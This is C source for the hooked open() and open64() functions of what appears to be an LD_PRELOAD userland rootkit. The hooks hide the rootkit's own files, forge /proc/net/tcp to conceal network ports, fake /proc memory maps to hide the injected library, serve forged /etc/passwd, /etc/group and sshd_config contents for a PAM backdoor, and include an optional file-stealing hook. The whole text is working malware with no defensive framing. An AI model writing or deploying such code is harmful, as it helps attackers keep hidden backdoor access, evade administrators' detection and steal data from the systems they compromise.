int open(const char *pathname, int flags, mode_t mode){
    hook(COPEN);

    if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
        return fileno(forgegroups(pathname));

    if(magicusr()){
        int ret = (long)call(COPEN, pathname, flags, mode);
#ifdef HIDE_MY_ASS
        if(ret && !pathtracked(pathname))
            trackwrite(pathname);
#endif
        return ret;
    }

#ifdef HIDE_SELF
    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
        ((process("ssh") || process("busybox")) &&
        (flags == (64|1|512)))){
        return (long)call(COPEN, "/dev/null", flags, mode);
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return fileno(forge_procnet(pathname));
#endif

#if defined SSHD_PATCH_SOFT && defined USE_PAM_BD
    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
        return fileno(sshdforge(pathname));
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    inspectfile(pathname);
#endif
    return (long)call(COPEN, pathname, flags, mode);
}




int open64(const char *pathname, int flags, mode_t mode){
    hook(COPEN64);

#ifdef USE_PAM_BD
    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
        return fileno(forgepasswd(pathname));

    if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
        return fileno(forgegroups(pathname));
#endif

    if(magicusr()){
        int ret = (long)call(COPEN64, pathname, flags, mode);
#ifdef HIDE_MY_ASS
        if(ret && !pathtracked(pathname))
            trackwrite(pathname);
#endif
        return ret;
    }

#ifdef HIDE_SELF
    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
        ((process("ssh") || process("busybox")) &&
        (flags == (64|1|512)))){
        return (long)call(COPEN64, "/dev/null", flags, mode);
    }
#endif

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

#ifdef HIDE_PORTS
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
        return fileno(forge_procnet(pathname));
#endif

#if defined SSHD_PATCH_SOFT && defined USE_PAM_BD
    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
        return fileno(sshdforge(pathname));
#endif

#ifdef FORGE_MAPS
    if(!fnmatch(MAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PROCPATH_MAXLEN];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
            if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }
#endif

#ifdef FILE_STEAL
    inspectfile(pathname);
#endif
    return (long)call(COPEN64, pathname, flags, mode);
}
